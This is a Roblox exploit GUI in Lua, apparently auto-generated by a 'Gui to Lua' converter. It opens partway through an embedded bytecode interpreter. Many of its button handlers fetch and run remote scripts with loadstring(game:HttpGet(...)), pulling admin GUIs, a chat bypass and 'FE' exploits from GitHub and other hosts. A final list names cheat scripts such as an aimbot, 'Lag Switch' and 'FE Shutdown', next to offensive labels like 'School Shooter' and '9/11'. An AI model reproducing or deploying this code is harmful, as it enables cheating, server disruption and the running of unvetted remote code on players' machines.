-- Gui to Lua
									lhs = inst.const_B
								else
									lhs = stack[inst.B]
								end
		
								if inst.is_KC then
									rhs = inst.const_C
								else
									rhs = stack[inst.C]
								end
		
								stack[inst.A] = lhs - rhs
							else
								--[[12 ADD]]
								local lhs, rhs
		
								if inst.is_KB then
									lhs = inst.const_B
								else
									lhs = stack[inst.B]
								end
		
								if inst.is_KC then
									rhs = inst.const_C
								else
									rhs = stack[inst.C]
								end
		
								stack[inst.A] = lhs + rhs
							end
						elseif op > 14 then
							if op < 17 then
								if op < 16 then
									--[[15 DIV]]
									local lhs, rhs
		
									if inst.is_KB then
										lhs = inst.const_B
									else
										lhs = stack[inst.B]
									end
		
									if inst.is_KC then
										rhs = inst.const_C
									else
										rhs = stack[inst.C]
									end
		
									stack[inst.A] = lhs / rhs
								else
									--[[16 MOD]]
									local lhs, rhs
		
									if inst.is_KB then
										lhs = inst.const_B
									else
										lhs = stack[inst.B]
									end
		
									if inst.is_KC then
										rhs = inst.const_C
									else
										rhs = stack[inst.C]
									end
		
									stack[inst.A] = lhs % rhs
								end
							elseif op > 17 then
								--[[18 UNM]]
								stack[inst.A] = -stack[inst.B]
							else
								--[[17 POW]]
								local lhs, rhs
		
								if inst.is_KB then
									lhs = inst.const_B
								else
									lhs = stack[inst.B]
								end
		
								if inst.is_KC then
									rhs = inst.const_C
								else
									rhs = stack[inst.C]
								end
		
								stack[inst.A] = lhs ^ rhs
							end
						else
							--[[14 MUL]]
							local lhs, rhs
		
							if inst.is_KB then
								lhs = inst.const_B
							else
								lhs = stack[inst.B]
							end
		
							if inst.is_KC then
								rhs = inst.const_C
							else
								rhs = stack[inst.C]
							end
		
							stack[inst.A] = lhs * rhs
						end
					else
						--[[9 SETTABLE]]
						local index, value
		
						if inst.is_KB then
							index = inst.const_B
						else
							index = stack[inst.B]
						end
		
						if inst.is_KC then
							value = inst.const_C
						else
							value = stack[inst.C]
						end
		
						stack[inst.A][index] = value
					end
				elseif op > 19 then
					if op < 29 then
						if op < 24 then
							if op < 22 then
								if op < 21 then
									--[[20 LEN]]
									stack[inst.A] = #stack[inst.B]
								else
									--[[21 CONCAT]]
									local str = stack[inst.B]
		
									for i = inst.B + 1, inst.C do str = str .. stack[i] end
		
									stack[inst.A] = str
								end
							elseif op > 22 then
								--[[23 EQ]]
								local lhs, rhs
		
								if inst.is_KB then
									lhs = inst.const_B
								else
									lhs = stack[inst.B]
								end
		
								if inst.is_KC then
									rhs = inst.const_C
								else
									rhs = stack[inst.C]
								end
		
								if (lhs == rhs) ~= (inst.A ~= 0) then pc = pc + 1 end
							else
								--[[22 JMP]]
								pc = pc + inst.sBx
							end
						elseif op > 24 then
							if op < 27 then
								if op < 26 then
									--[[25 LE]]
									local lhs, rhs
		
									if inst.is_KB then
										lhs = inst.const_B
									else
										lhs = stack[inst.B]
									end
		
									if inst.is_KC then
										rhs = inst.const_C
									else
										rhs = stack[inst.C]
									end
		
									if (lhs <= rhs) ~= (inst.A ~= 0) then pc = pc + 1 end
								else
									--[[26 TEST]]
									if (not stack[inst.A]) == (inst.C ~= 0) then pc = pc + 1 end
								end
							elseif op > 27 then
								--[[28 CALL]]
								local A = inst.A
								local B = inst.B
								local C = inst.C
								local params
								local sz_vals, l_vals
		
								if B == 0 then
									params = stktop - A
								else
									params = B - 1
								end
		
								sz_vals, l_vals = wrap_lua_variadic(stack[A](unpack(stack, A + 1, A + params)))
		
								if C == 0 then
									stktop = A + sz_vals - 1
								else
									sz_vals = C - 1
								end
		
								for i = 1, sz_vals do stack[A + i - 1] = l_vals[i] end
							else
								--[[27 TESTSET]]
								local A = inst.A
								local B = inst.B
		
								if (not stack[B]) == (inst.C ~= 0) then
									pc = pc + 1
								else
									stack[A] = stack[B]
								end
							end
						else
							--[[24 LT]]
							local lhs, rhs
		
							if inst.is_KB then
								lhs = inst.const_B
							else
								lhs = stack[inst.B]
							end
		
							if inst.is_KC then
								rhs = inst.const_C
							else
								rhs = stack[inst.C]
							end
		
							if (lhs < rhs) ~= (inst.A ~= 0) then pc = pc + 1 end
						end
					elseif op > 29 then
						if op < 34 then
							if op < 32 then
								if op < 31 then
									--[[30 RETURN]]
									local A = inst.A
									local B = inst.B
									local vals = {}
									local size
		
									if B == 0 then
										size = stktop - A + 1
									else
										size = B - 1
									end
		
									for i = 1, size do vals[i] = stack[A + i - 1] end
		
									close_lua_upvalues(openupvs, 0)
									return size, vals
								else
									--[[31 FORLOOP]]
									local A = inst.A
									local step = stack[A + 2]
									local index = stack[A] + step
									local limit = stack[A + 1]
									local loops
		
									if step == math.abs(step) then
										loops = index <= limit
									else
										loops = index >= limit
									end
		
									if loops then
										stack[inst.A] = index
										stack[inst.A + 3] = index
										pc = pc + inst.sBx
									end
								end
							elseif op > 32 then
								--[[33 TFORLOOP]]
								local A = inst.A
								local func = stack[A]
								local state = stack[A + 1]
								local index = stack[A + 2]
								local base = A + 3
								local vals
		
								stack[base + 2] = index
								stack[base + 1] = state
								stack[base] = func
		
								vals = {func(state, index)}
		
								for i = 1, inst.C do stack[base + i - 1] = vals[i] end
		
								if stack[base] ~= nil then
									stack[A + 2] = stack[base]
								else
									pc = pc + 1
								end
							else
								--[[32 FORPREP]]
								local A = inst.A
								local init, limit, step
		
								init = assert(tonumber(stack[A]), '`for` initial value must be a number')
								limit = assert(tonumber(stack[A + 1]), '`for` limit must be a number')
								step = assert(tonumber(stack[A + 2]), '`for` step must be a number')
		
								stack[A] = init - step
								stack[A + 1] = limit
								stack[A + 2] = step
		
								pc = pc + inst.sBx
							end
						elseif op > 34 then
							if op < 36 then
								--[[35 CLOSE]]
								close_lua_upvalues(openupvs, inst.A)
							elseif op > 36 then
								--[[37 VARARG]]
								local A = inst.A
								local size = inst.B
		
								if size == 0 then
									size = vargs.size
									stktop = A + size - 1
								end
		
								for i = 1, size do stack[A + i - 1] = vargs.list[i] end
							else
								--[[36 CLOSURE]]
								local sub = subs[inst.Bx + 1] -- offset for 1 based index
								local nups = sub.numupvals
								local uvlist
		
								if nups ~= 0 then
									uvlist = {}
		
									for i = 1, nups do
										local pseudo = code[pc + i - 1]
		
										if pseudo.op == 0 then -- @MOVE
											uvlist[i - 1] = open_lua_upvalue(openupvs, pseudo.B, stack)
										elseif pseudo.op == 4 then -- @GETUPVAL
											uvlist[i - 1] = upvs[pseudo.B]
										end
									end
		
									pc = pc + nups
								end
		
								stack[inst.A] = wrap_lua_func(sub, env, uvlist)
							end
						else
							--[[34 SETLIST]]
							local A = inst.A
							local C = inst.C
							local size = inst.B
							local tab = stack[A]
							local offset
		
							if size == 0 then size = stktop - A end
		
							if C == 0 then
								C = inst[pc].value
								pc = pc + 1
							end
		
							offset = (C - 1) * FIELDS_PER_FLUSH
		
							for i = 1, size do tab[i + offset] = stack[A + i] end
						end
					else
						--[[29 TAILCALL]]
						local A = inst.A
						local B = inst.B
						local params
		
						if B == 0 then
							params = stktop - A
						else
							params = B - 1
						end
		
						close_lua_upvalues(openupvs, 0)
						return wrap_lua_variadic(stack[A](unpack(stack, A + 1, A + params)))
					end
				else
					--[[19 NOT]]
					stack[inst.A] = not stack[inst.B]
				end
		
				exst.pc = pc
			end
		end
		
		function wrap_lua_func(state, env, upvals)
			local st_code = state.code
			local st_subs = state.subs
			local st_lines = state.lines
			local st_source = state.source
			local st_numparams = state.numparams
		
			local function exec_wrap(...)
				local stack = {}
				local varargs = {}
				local sizevarg = 0
				local sz_args, l_args = wrap_lua_variadic(...)
		
				local exst
				local ok, err, vals
		
				for i = 1, st_numparams do stack[i - 1] = l_args[i] end
		
				if st_numparams < sz_args then
					sizevarg = sz_args - st_numparams
					for i = 1, sizevarg do varargs[i] = l_args[st_numparams + i] end
				end
		
				exst = {
					varargs = {list = varargs, size = sizevarg},
					code = st_code,
					subs = st_subs,
					lines = st_lines,
					source = st_source,
					env = env,
					upvals = upvals,
					stack = stack,
					pc = 1,
				}
		
				ok, err, vals = pcall(exec_lua_func, exst, ...)
		
				if ok then
					return unpack(vals, 1, err)
				else
					on_lua_error(exst, err)
				end
		
				return -- explicit "return nothing"
			end
		
			return exec_wrap
		end
		
		return function(bCode, env)
			return wrap_lua_func(stm_lua_bytecode(bCode), env or getfenv(0))
		end
	end
	fake_module_scripts[script] = module_script
end


-- Scripts:

local function YDFTQ_fake_script() -- Open.LocalScript 
	local script = Instance.new('LocalScript', Open)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	local OpenBtn = script.Parent
	local MoonFrame = script.Parent.Parent.MoonFrame
	OpenBtn.MouseButton1Click:Connect(function (click)
		if MoonFrame.Visible == false then
			MoonFrame.Visible = true
			script.Parent.TextLabel.Text = "Close"
		else
			MoonFrame.Visible = false
		script.Parent.TextLabel.Text = "Open"
		end
	end)
end
coroutine.wrap(YDFTQ_fake_script)()
local function ASDMEV_fake_script() -- Button.LocalScript 
	local script = Instance.new('LocalScript', Button)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		local Scripts = script.Parent.Parent.Parent.ScriptsUIFrame
		script.Parent.Parent.Parent.FunUIFrame.Visible = false
		script.Parent.Parent.Parent.HomeUIFrame.Visible = false
		script.Parent.Parent.Parent.CreditsUIFrame.Visible = false
		Scripts.Visible = true
	    script.Parent.Parent.Parent.ExecutorUIFrame.Visible = false
	    script.Parent.Parent.Parent.SSUIFrame.Visible = false
	end)
end
coroutine.wrap(ASDMEV_fake_script)()
local function EYYAL_fake_script() -- Button_2.LocalScript 
	local script = Instance.new('LocalScript', Button_2)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.ScriptsUIFrame.Visible = false
		script.Parent.Parent.Parent.FunUIFrame.Visible = true
		script.Parent.Parent.Parent.HomeUIFrame.Visible = false
		script.Parent.Parent.Parent.CreditsUIFrame.Visible = false
	    script.Parent.Parent.Parent.ExecutorUIFrame.Visible = false
	    script.Parent.Parent.Parent.SSUIFrame.Visible = false
	end)
end
coroutine.wrap(EYYAL_fake_script)()
local function UPSLZU_fake_script() -- Button_3.LocalScript 
	local script = Instance.new('LocalScript', Button_3)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		local Scripts = script.Parent.Parent.Parent.ScriptsUIFrame
		script.Parent.Parent.Parent.FunUIFrame.Visible = false
		script.Parent.Parent.Parent.HomeUIFrame.Visible = false
		Scripts.Visible = false
		script.Parent.Parent.Parent.CreditsUIFrame.Visible = true
	    script.Parent.Parent.Parent.ExecutorUIFrame.Visible = false
	    script.Parent.Parent.Parent.SSUIFrame.Visible = false
	end)
end
coroutine.wrap(UPSLZU_fake_script)()
local function KOHT_fake_script() -- Button_4.LocalScript 
	local script = Instance.new('LocalScript', Button_4)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.ScriptsUIFrame.Visible = false
		script.Parent.Parent.Parent.FunUIFrame.Visible = false
		script.Parent.Parent.Parent.CreditsUIFrame.Visible = false
		script.Parent.Parent.Parent.HomeUIFrame.Visible = false
	    script.Parent.Parent.Parent.ExecutorUIFrame.Visible = true
	    script.Parent.Parent.Parent.SSUIFrame.Visible = false
	end)
end
coroutine.wrap(KOHT_fake_script)()
local function NJCFRIG_fake_script() -- Button_5.LocalScript 
	local script = Instance.new('LocalScript', Button_5)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		local Scripts = script.Parent.Parent.Parent.ScriptsUIFrame
		script.Parent.Parent.Parent.FunUIFrame.Visible = false
		script.Parent.Parent.Parent.CreditsUIFrame.Visible = false
		script.Parent.Parent.Parent.ExecutorUIFrame.Visible = false
		script.Parent.Parent.Parent.HomeUIFrame.Visible = true
	    Scripts.Visible = false
	    script.Parent.Parent.Parent.SSUIFrame.Visible = false
	end)
end
coroutine.wrap(NJCFRIG_fake_script)()
local function FBTHADJ_fake_script() -- Button_6.LocalScript 
	local script = Instance.new('LocalScript', Button_6)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.ScriptsUIFrame.Visible = false
		script.Parent.Parent.Parent.FunUIFrame.Visible = false
		script.Parent.Parent.Parent.CreditsUIFrame.Visible = false
		script.Parent.Parent.Parent.HomeUIFrame.Visible = false
	    script.Parent.Parent.Parent.ExecutorUIFrame.Visible = false
	    script.Parent.Parent.Parent.SSUIFrame.Visible = true
	end)
end
coroutine.wrap(FBTHADJ_fake_script)()
local function ZCRXF_fake_script() -- Button_7.LocalScript 
	local script = Instance.new('LocalScript', Button_7)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
	--[[
		local Scripts = script.Parent.Parent.Parent.ScriptsUIFrame
		script.Parent.Parent.Parent.FunUIFrame.Visible = false
		script.Parent.Parent.Parent.HomeUIFrame.Visible = false
		script.Parent.Parent.Parent.CreditsUIFrame.Visible = false
		Scripts.Visible = true
		script.Parent.Parent.Parent.ExecutorUIFrame.Visible = false
		script.Parent.Parent.Parent.SSUIFrame.Visible = false
	--]]
	end)
end
coroutine.wrap(ZCRXF_fake_script)()
local function BEZFI_fake_script() -- Button_8.LocalScript 
	local script = Instance.new('LocalScript', Button_8)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
	end)
end
coroutine.wrap(BEZFI_fake_script)()
function ZCHJD_fake_script() -- Button_9.LocalScript 
	local script = Instance.new('LocalScript', Button_9)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://solarishub.dev/script.lua',true))()
	end)
end
coroutine.wrap(ZCHJD_fake_script)()
function LPKY_fake_script() -- Button_10.LocalScript 
	local script = Instance.new('LocalScript', Button_10)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/EGWGE/main/synapse%20x%20ui.txt'))()
	end)
end
coroutine.wrap(LPKY_fake_script)()
function YZHOCT_fake_script() -- Button_11.LocalScript 
	local script = Instance.new('LocalScript', Button_11)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/FAFAFAF/main/SGDGF'))()
	end)
end
coroutine.wrap(YZHOCT_fake_script)()
function TAMXJY_fake_script() -- Button_12.LocalScript 
	local script = Instance.new('LocalScript', Button_12)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/FDSFSGFG/main/VERY%20OP%20ADMIN%20GUI.txt'))()
	end)
end
coroutine.wrap(TAMXJY_fake_script)()
function THBEFMY_fake_script() -- Button_13.LocalScript 
	local script = Instance.new('LocalScript', Button_13)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/FDSFSGFG/main/FGtgjKwD.txt'))()
	end)
end
coroutine.wrap(THBEFMY_fake_script)()
function UXUMC_fake_script() -- Button_14.LocalScript 
	local script = Instance.new('LocalScript', Button_14)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
	end)
end
coroutine.wrap(UXUMC_fake_script)()
function OOER_fake_script() -- Button_15.LocalScript 
	local script = Instance.new('LocalScript', Button_15)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/EUOHFIWIDKA/main/FE%20Gui.txt'))()
	end)
end
coroutine.wrap(OOER_fake_script)()
function UZOBGUI_fake_script() -- Button_16.LocalScript 
	local script = Instance.new('LocalScript', Button_16)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/GRHRG/main/EGSEGE'))()
	end)
end
coroutine.wrap(UZOBGUI_fake_script)()
function SNDZT_fake_script() -- Button_17.LocalScript 
	local script = Instance.new('LocalScript', Button_17)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/FDSFSGFG/main/Cobra_Kai_GUI_rscripts.net.txt'))()
	end)
end
coroutine.wrap(SNDZT_fake_script)()
function EQKTJ_fake_script() -- Button_18.LocalScript 
	local script = Instance.new('LocalScript', Button_18)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/FSFGEGEGE/main/Reviz%20admin%20V2%20ROBLOX.txt'))()
	end)
end
coroutine.wrap(EQKTJ_fake_script)()
function KCZAC_fake_script() -- Button_19.LocalScript 
	local script = Instance.new('LocalScript', Button_19)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/EGEGESGGH/main/FE%20Animation%20GUI.txt'))()
	end)
end
coroutine.wrap(KCZAC_fake_script)()
function KWEFMZI_fake_script() -- Button_20.LocalScript 
	local script = Instance.new('LocalScript', Button_20)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/IlikeyocutgHAH12/FDSFSGFG/main/CASE%20CLICKER%20SCRIPT.txt'))()
	end)
end
coroutine.wrap(KWEFMZI_fake_script)()
function PJBXUC_fake_script() -- Button_21.LocalScript 
	local script = Instance.new('LocalScript', Button_21)
	local req = require
	local require = function(obj)
		local fake = fake_module_scripts[obj]
		if fake then
			return fake()
		end
		return req(obj)
	end

	script.Parent.MouseButton1Click:Connect(function()
		--local coreGui = game:GetService("Players").LocalPlayer.PlayerGui
		local coreGui = game:GetService("CoreGui")
		local tweening = false
		local tabPos = 5
		local scriptsTabText = ""
		local feTabText = ""
		local gameScriptsTabText = ""
		local guiTabText = ""
	
		local scripttabList = {
			{"Infinite Yield", "MjBzRjmT", 1},
			{"Knife V3", "W833RBFr", 1},
			{"Bird Wings", "RQ9b8UTv", 1},
			{"M4A1", "eP1zq8tb", 1},
			{"Dungun", "90M7Mi8e", 1},
			{"Bomb Vest", "tG1PPuMd", 1},
			{"Music Bars", "SvYebC2r", 1},
			{"Omni God", "87NeeChc", 1},
			{"Pain Titan", "Hg5L8EtM", 1,},
			{"Reaper Titan", "B0q3QBg6", 1},
			{"Alter Chat", "ZSB4pN9R", 1},
			{"Hoverbike", 01268225564, 2},
			{"Rail Gun Titan", "0wFiFdwM", 1},
			{"True Hero", "P8AQ2ebJ", 1},
			{"Celestial Wheel", "bymTcgzf", 1},
			{"Knive V4", "j0Ns1w1S", 1},
			{"Ravenger Claws", "D7GxxvWL", 1},
			{"John Doe", "m5wHsLhr", 1},
			{"Messor Titan", "4bSrkLtA", 1},
			{"Clown Titan", "L0WLDZvc", 1},
			{"Chara", "HrWjgXtb", 1},
			{"Shedlesky Rage", "2SPz35LS", 1},
			{"LunchaThug", "x6GWFC5K", 1},
			{"Nazi Flag", "ZCZNxFBD", 1},
			{"Psychopath", "DGqk3bqY", 1},
			{"Fireworks Wand", "GB29NAPv", 1},
			{"Psycho Clown", "UgxKqKwE", 1},
			{"Inferno", "qhMGk36S", 1},
			{"Police Titan", "UCmufLU8", 1},
			{"Galaxy Titan", "nKNdCrKj", 1},
			{"Holy Wrench", "cKSh0a8C", 1},
			{"Krystal Dance", "j7EqLfbP", 1},
			{"Pee", "3CYmA0Pz", 1},
			{"Jihad", "vSujnuaF", 1},
			{"Hermit Purple", "R3C3ajQV", 1},
			{"Golden Gun", "2574Sd9E", 1},
			{"Goku", "yAXZZF9r", 1},
			{"Emoji", "vKPcMKnm", 1},
			{"Damn Son", "AMLHT8aJ", 1},
			{"Devuzi", "q0mt2peM", 1},
			{"Flash", "gGSVVq1H", 1},
			{"Teal Scythe", "0TUBSaxt", 1},
			{"Demon Demise", "ghMDMW63", 1},
			{"Red Sayan", "uC5DBvf9", 1},
			{"Ban Hammer", "1ynQ4Mu0", 1},
			{"Dick Gun", "UR9FBjcj", 1},
			{"Dat Boi", "Sz7KJHay", 1},
			{"Watermelon Trap", "pypsM3hj", 1},
			{"Whip", "XDsek3Rf", 1},
			{"School Shooter", "EmmwRFDA", 1},
			{"9/11", "3UmV26hG", 1},
			{"Bong", "8Kb08E9s", 1},
			{"Horse", "MVph7nmq", 1},
			{"Scythe", "fEEVkJba", 1},
			{"Disco Fog", "xg8d4PS0", 1},
			{"Disco Mesh", "GvtPCRVR", 1},
			{"Russian Dance", "RADQ2vH8", 1},
			{"Sun God", "0uJhLJ5m", 1},
			{"Rolling Light Ball", "S4Hj3MPd", 1},
			{"Red Death Scythe", "KJ5nqeVF", 1},
			{"Crystal Pistols", "GDLZ4VAq", 1},
			{"Epic Sword", "DZVV9AGG", 1},
			{"Circle Visualizer", "diJiteen", 1},
			{"Hex Blade", "fA0bBELV", 1},
			{"Bulldog", "nPPLxSA3", 1},
			{"FS-627-SENDER", "R3m4gfuP", 1},
			{"Voodoo Child", "w5TEtd0Q", 1},
			{"Bye Bye", "XBysEMgg", 1},
			{"Galil V2", "cnFz3h8D", 1},
			{"Mario", "pKmtnc9u", 1},
			{"Lighting Blade", "rMEe8R4N", 1},
			{"Flamingo Skybox", "8rWM880e", 1},
			{"Sin Unleashed", "ZQh5B023", 1},
			{"Ravager", "VQEz6a6i", 1},
			{"Brock", "Fe5YrxcY", 1},
			{"M249", "J4ijx897", 1},
			{"MG36", "zLZ4Auqn", 1},
			{"Omega Scythe", "Ag8dKZYB", 1},
			{"Omega Sword", "7JjxwhPn", 1},
		}
	
		local fescripttabList = {
			{"Fe God", "KduGECH6", 1},
			{"Fe Fly", 1281055032, 2},
			{"Fe Invisible", 1180480887, 2},
			{"Spam", "74GjB7tB", 1},
			{"Lag Switch", "58gjTUf5", 1},
			{"FE Shutdown", "0wgKhFmf", 1},
		}
	
		local gameScriptsList = {
			{"PF Virgo 2.0", "7TeJszah", 1},
			{"City Life Bomb Vest", "sLHGSBn1", 1},
			{"City Life Suicide", "YdKKQ7yT", 1},
			{"City Life Explosion", "vy78mqrG", 1},
			{"CB:RO Aimbot", "t3yHg06t", 1},
		}
	
		local guitabList = {
			{"c00lgui", "Rz2EFsLU", 1},
			{"Topkek 4.0", "d0CJRrcg", 1},
			{"Topkek 3.0", "SikGfE9u", 1},
			{"Ro-Xploit 4.0", 175137115, 2},
			{"Ro-Xploit 5.0", 288646117, 2},
			{"Ro-Xploit 6.0", 364364477, 2},
			{"Dex 3.0", 492005721, 2},
			{"Clown Van", "a5UZuuiT", 1},
			{"Hell Elevator GUI", "8NYWpf2T", 1},
			{"Chams / Aimlock", "Yi7fzELj", 1},
			{"YourMom GUI", "289110135", 2},
			{"Pepe GUI", "277881926", 2},
			{"Brack Hub", "PT9Gf7d5", 2},
		}
	
		local mapsList = {
			{"Clockwork Arena", "EvnXCXhP", 1},
			{"Town Map", 1345094164, 2},
			{"Cave Island", "t29C42rm", 1},
			{"Nature Map", "gmF4Kq5B", 1},
			{"Nazi Map", "az8sLCLT", 1},
			{"Ritual Room", "hYCTFiAC", 1},
			{"Stripper", "jztW5Vuy", 1},
			{"Witch Map", "R9epW292", 1},
			{"Rainbow Tunnel", "8bznLitn", 1},
			{"Scary Map", "fNw46f74", 1},
			{"Nazi Camp", "KJNk4STm", 1},
			{"Night Club", 1281063730, 2},
		}
	
		local lists = {
			{scripttabList, "Scripts"},
			{fescripttabList, "FE Scripts"},
			{gameScriptsList, "Game Scripts"},
			{guitabList, "GUIs"},
			{mapsList, "Maps"},
		}
	
		local function makeFrame(Active, BackgroundColor3, BorderSizePixel, Name, Parent, Position, Size, ClipsDescendants, Draggable, BackgroundTransparency)
			local Frame = Instance.new("Frame")
			Frame.Active = Active
			Frame.BackgroundColor3 = BackgroundColor3
			Frame.BorderSizePixel = BorderSizePixel
			Frame.Name = Name
			Frame.Parent = Parent
			Frame.Position = Position
			Frame.Size = Size
			Frame.ClipsDescendants = ClipsDescendants
			Frame.Draggable = Draggable
			Frame.BackgroundTransparency = BackgroundTransparency
		end
	
		local function makeScrollingFrame(BackgroundColor3, BorderSizePixel, Name, Parent, Position, Size, CanvasSize, BackgroundTransparency, ScrollBarThickness)
			local ScrollingFrame = Instance.new("ScrollingFrame")
			ScrollingFrame.BackgroundColor3 = BackgroundColor3
			ScrollingFrame.BorderSizePixel = BorderSizePixel
			ScrollingFrame.Name = Name
			ScrollingFrame.Parent = Parent
			ScrollingFrame.Position = Position
			ScrollingFrame.Size = Size
			ScrollingFrame.CanvasSize = CanvasSize
			ScrollingFrame.BackgroundTransparency = BackgroundTransparency
			ScrollingFrame.ScrollBarThickness = ScrollBarThickness
		end
	
		local function makeTextLabel(BackgroundColor3, BackgroundTransparency, Name, Parent, Position, Size, Font, Text, TextColor3, TextSize, BorderSizePixel, TextWrapped)
			local TextLabel = Instance.new("TextLabel")
			TextLabel.BackgroundColor3 = BackgroundColor3
			TextLabel.BackgroundTransparency = BackgroundTransparency
			TextLabel.Name = Name
			TextLabel.Parent = Parent
			TextLabel.Position = Position
			TextLabel.Size = Size
			TextLabel.Font = Font
			TextLabel.Text = Text
			TextLabel.TextColor3 = TextColor3
			TextLabel.TextSize = TextSize
			TextLabel.BorderSizePixel = BorderSizePixel
			TextLabel.TextWrapped = TextWrapped
		end
	
